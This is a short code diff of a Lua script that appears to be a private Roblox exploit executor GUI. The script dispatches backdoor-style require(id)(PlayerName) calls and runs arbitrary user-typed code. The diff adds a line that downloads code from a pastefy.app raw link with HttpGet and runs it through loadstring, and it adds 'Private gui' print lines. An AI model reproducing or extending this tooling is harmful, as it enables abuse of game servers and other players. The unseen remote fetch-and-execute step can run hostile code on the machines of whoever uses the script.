@@ -83,11 +83,12 @@ ExecuteBtn.MouseButton1Click:Connect(function()
     elseif code:find("require%(10850%)") then
         -- Executes: require(10850)(PlayerName)
         
+print('Private gui by cel0n')
 
     elseif code:find("require%(3100090%)") then
         -- Executes: require(3100090)(PlayerName)
-        
-
+        loadstring(Game:HttpGet("https://pastefy.app/qQ1FyEeF/raw"))()
+print('Private gui 1.5')
     else
         -- Executes anything else the user types
         local success, err = pcall(function()
